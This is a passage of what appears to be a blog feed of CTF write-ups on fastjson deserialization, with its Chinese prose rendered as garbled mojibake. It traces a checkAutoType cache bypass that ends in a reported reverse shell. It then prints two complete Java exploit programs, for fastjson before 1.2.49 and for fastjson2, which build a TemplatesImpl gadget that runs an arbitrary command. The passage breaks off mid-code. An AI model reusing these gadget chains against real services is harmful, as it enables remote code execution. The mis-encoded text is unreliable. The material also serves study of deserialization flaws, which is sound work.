class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>ç®€å•çš„ç±»åæ£€æŸ¥ï¼Œè‹¥å¤„äºé»‘åå•åˆ™æŠ›å‡ºå¼‚å¸¸ autoType is not support xxx<br><span class="hljs-number">2.</span>ä½¿ç”¨ä¸‰ç§æ–¹æ³•é€šè¿‡ç±»åæ¥åŠ è½½ç±»ï¼š<br>        TypeUtils.getClassFormMappings (åŸºæœ¬éƒ½é€šè¿‡è¿™ä¸ªæ–¹æ³•æ‰¾åˆ°)<br>        IdentityHashMap.findClass<br>        ConcurrentHashMap.get<br><span class="hljs-number">3.</span>è‹¥æ‰¾åˆ°ï¼Œä¼šè¿›å…¥ä»¥ä¸‹<span class="hljs-keyword">if</span>è¿›è€Œ<span class="hljs-keyword">return</span>æ‰¾åˆ°çš„ç±»æå‰é€€å‡ºcheckAutoTypeå‡½æ•°<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-number">4.</span>ç»§ç»­æ‰§è¡Œï¼Œé€šè¿‡TypeUtilsçš„loadClassæ–¹æ³•åˆ©ç”¨ç±»åŠ è½½å™¨æ‰¾åˆ°ç±»ï¼Œå¹¶å°†å½“å‰ç±»åŠ å…¥TypeUtilsçš„mappingsä¸­<br><span class="hljs-number">5.</span>è°ƒç”¨JavaBeanInfoçš„buildæ–¹æ³•ï¼Œä¼ å…¥å½“å‰ç±»ï¼Œå½“ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ <span class="hljs-keyword">default</span> constructor not found. xxxx<br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–"><a href="#ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–" class="headerlink" title="ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–"></a>ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–</h3><p>é¦–å…ˆæ˜¯å…¥å£ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">objectInputStream.readObject();<br></code></pre></td></tr></table></figure><p>æ¥ç€æ¥åˆ°JSONArray#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      JSONObject.SecureObjectInputStream.ensureFields();<br>      <span class="hljs-keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="hljs-literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;<br>          <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">secIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>.SecureObjectInputStream(in);<br>          <span class="hljs-keyword">try</span> &#123;<br>              secIn.defaultReadObject();<br>              <span class="hljs-keyword">return</span>;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.NotActiveException e) &#123;<br>              <span class="hljs-comment">// skip</span><br>          &#125;<br>      &#125;<br>  <span class="hljs-comment">//ã€‚ã€‚ã€‚</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå°±è¢«<code>SecureObjectInputStream</code>åŠ«æŒäº†</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237433.png" alt="image-20230505020221637"></p><p>ç›´æ¥æ¥åˆ°æœ€å…³é”®çš„checkAutoTypeæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å…ˆæ‰¾çš„æ˜¯MyBean</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237274.png" alt="image-20230505020313917"></p><p>è·Ÿè¿›checkAutoTypeæ–¹æ³•ï¼Œå‰é¢éƒ¨åˆ†è·³è¿‡ï¼Œç›´æ¥æ¥ä¸ªç»å…¸ä¸‰ä¸ªæ–¹æ³•å¯»æ‰¾ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237845.png" alt="image-20230505020425672"></p><p>è¿™é‡Œå¯ä»¥å…ˆè·Ÿè¿›ä¸€ä¸‹getClassFromMappingæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„Mappingsï¼ˆsizeï¼š107ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237915.png" alt="image-20230505020521779"></p><p>ç»è¿‡ä¸‰ä¸ªæ–¹æ³•ï¼Œä»ç„¶æ²¡æœ‰æ‰¾åˆ°ç±»ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ¥ä¸‹æ¥ä¸€å®šä¼šå»åˆ°JavaBeanInfoçš„buildæ–¹æ³•ä¸­(å¼‚å¸¸æŠ›å‡ºç‚¹)ï¼Œä¸è¿‡åœ¨è¿™ä¹‹å‰ä¼šå…ˆé€šè¿‡Typeutilsçš„loadClassæ–¹æ³•æ‰¾åˆ°ç±»ï¼Œå¹¶æ·»åŠ mappingsçš„æ•°é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>&#125;<br></code></pre></td></tr></table></figure><p>MyBeanè¢«æ·»åŠ ï¼Œsizeå˜ä¸º108</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238540.png" alt="image-20230505020903956"></p><p>ä¹‹åå°±æ¥åˆ°äº†è¿™ä¸ªæ­»äº¡å¼‚å¸¸æŠ›å‡ºç‚¹JavaBeanInfoçš„buildæ–¹æ³•ï¼Œä½†ä½ ä¼šæƒŠå¥‡çš„å‘ç°ï¼Œå¹¶æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œç¨‹åºç»§ç»­èµ°åˆ°äº†ä¸‹ä¸€ä¸ªç±»RMIConnectorä¼ å…¥checkAutoTypeæ–¹æ³•ï¼Œå…¶å®æ˜¯å› ä¸ºè¿™ä¸ªifçš„æ¡ä»¶ä¸æ»¡è¶³ï¼Œbuildå‡½æ•°æå‰è¿”å›</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238797.png" alt="image-20230505021125948"></p><blockquote><p>è¿™ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œé‚£ä¸ªå¼‚å¸¸æç¤ºçš„å¾ˆæ˜æ˜¾äº†<code>default constructor not found. class xxx</code>è€ŒMyBeanæ˜æ˜¾æ˜¯æœ‰æ— å‚æ„é€ æ–¹æ³•çš„ï¼Œè¿™é‡Œçš„defaultConstructorå°±æ˜¯è·å–åˆ°äº†æ— å‚æ„é€ æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238509.png" alt="image-20230505015849391"></p></blockquote><p>æ²¡æœ‰å¼‚å¸¸æŠ›å‡ºï¼Œæ— äº‹å‘ç”Ÿï¼Œæ¥ç€è½®åˆ°RMIConnector</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050247946.png" alt="image-20230505021320328"></p><p>åé¢éƒ½æ˜¯ä¸€æ ·çš„æ“ä½œï¼Œä¸‰ä¸ªæ–¹æ³•éƒ½æ‰¾ä¸åˆ°ç±»ï¼Œè¢«æ·»åŠ è¿›mappingsï¼Œsize+1</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238031.png" alt="image-20230505021419699"></p><p>ç„¶åæ¥åˆ°æ­»äº¡å¼‚å¸¸æŠ›å‡ºç‚¹JavaBeanInfoçš„buildæ–¹æ³•ï¼Œæ²¡æœ‰æ— å‚æ„é€ å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238335.png" alt="image-20230505021538934"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239359.png" alt="image-20230505021549225"></p><p>è¿æ¥ç¬¬ä¸€æ¬¡æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239280.png" alt="image-20230505021625294"></p><h3 id="ç¬¬äºŒæ¬¡ååºåˆ—åŒ–"><a href="#ç¬¬äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="ç¬¬äºŒæ¬¡ååºåˆ—åŒ–"></a>ç¬¬äºŒæ¬¡ååºåˆ—åŒ–</h3><p>æ¥ç€è¿›è¡Œç¬¬äºŒæ¬¡ï¼Œå‘é€payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239992.png" alt="image-20230505021702771"></p><p>MyBeanå’ŒRMIConnectorçš„checkAutoTypeå°±å…ˆè·³è¿‡ï¼Œè¿™ä¸¤ç±»ä»¥åŠè¢«åŠ å…¥mappingsäº†ï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸‰ä¸ªæ–¹æ³•åçš„è¿™éƒ¨åˆ†ä»£ç æå‰é€€å‡ºçš„,å°±ä¸å†è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥å¼€å§‹åˆ†æJMXServiceURLï¼Œä¸‰ä¸ªæ–¹æ³•æ‰¾ä¸åˆ°ç±»ï¼Œè°ƒç”¨laodClass</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239172.png" alt="image-20230505021939903"></p><p>åŠ å…¥mappingsï¼Œ size+1ï¼Œè‡³æ­¤ï¼Œå¯ä»¥æ”¯æŒååºåˆ—åŒ–æˆåŠŸçš„mappignså·²ç»è£…å¡«å¥½</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239392.png" alt="image-20230505022008745"></p><p>ä¹‹ååˆå› ä¸ºæ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æŠ›å‡ºå¼‚å¸¸</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239543.png" alt="image-20230505022107758"></p><p>è¿æ¥ç¬¬äºŒä¸ªæŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239596.png" alt="image-20230505022142322"></p><h3 id="ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰"><a href="#ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰" class="headerlink" title="ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰"></a>ç¬¬ä¸‰æ¬¡ååºåˆ—åŒ–ï¼ˆä¹Ÿæ˜¯ååºåˆ—åŒ–æˆåŠŸçš„å¼€å§‹ï¼‰</h3><p>å…ˆæå‰æ¶èµ·ldapæœåŠ¡å’Œvpsç›‘å¬</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png" alt="image-20230505022409515"></p><p>å‘é€payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png" alt="image-20230505022432324"></p><p>é€šè¿‡äº†å‰é¢ä¸‰ä¸ªç±»çš„checkAutoTypeæ–¹æ³•ï¼Œæ¥åˆ°BadAttributeValueExpExceptionçš„readObjectæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png" alt="image-20230505022631154"></p><p>æ¥ç€è§¦å‘getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png" alt="image-20230505022649684"></p><p>æˆåŠŸåå¼¹shell</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png" alt="image-20230505022721373"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJsonä¸åŸç”Ÿååºåˆ—åŒ–</title>
      <link href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJsonä¸åŸç”Ÿååºåˆ—åŒ–"><a href="#FastJsonä¸åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="FastJsonä¸åŸç”Ÿååºåˆ—åŒ–"></a>FastJsonä¸åŸç”Ÿååºåˆ—åŒ–</h1><h2 id="ç¬¬ä¸€ç‰ˆ-lt-1-2-49"><a href="#ç¬¬ä¸€ç‰ˆ-lt-1-2-49" class="headerlink" title="ç¬¬ä¸€ç‰ˆ &lt;1.2.49"></a>ç¬¬ä¸€ç‰ˆ &lt;1.2.49</h2><p>åœ¨Jsonç±»å½“ä¸­çš„toStringæ–¹æ³•èƒ½è§¦å‘toJsonStringçš„è°ƒç”¨ï¼Œè€Œè¿™ä¸ªä¸œè¥¿å…¶å®æˆ‘ä»¬å¹¶ä¸é™Œç”Ÿï¼Œåœ¨æˆ‘ä»¬æƒ³ç”¨JSON.parse()è§¦å‘getæ–¹æ³•æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªå¤„ç†æ–¹æ³•å°±æ˜¯ç”¨JSONObjectåµŒå¥—æˆ‘ä»¬çš„payload</p><p>è§¦å‘toString-&gt;toJSONString-&gt;getæ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032239697.png" alt="image-20230421235341029"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson2-å…¨ç‰ˆæœ¬"><a href="#fastjson2-å…¨ç‰ˆæœ¬" class="headerlink" title="fastjson2 å…¨ç‰ˆæœ¬"></a>fastjson2 å…¨ç‰ˆæœ¬</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡resolveClass"><a href="#ç»•è¿‡resolveClass" class="headerlink" title="ç»•è¿‡resolveClass"></a>ç»•è¿‡resolveClass</h2><h3 id="æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ"><a href="#æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ"></a>æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ</h3><p>è·Ÿè¿›<code>java.io.ObjectInputStream#readObject0</code>,ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 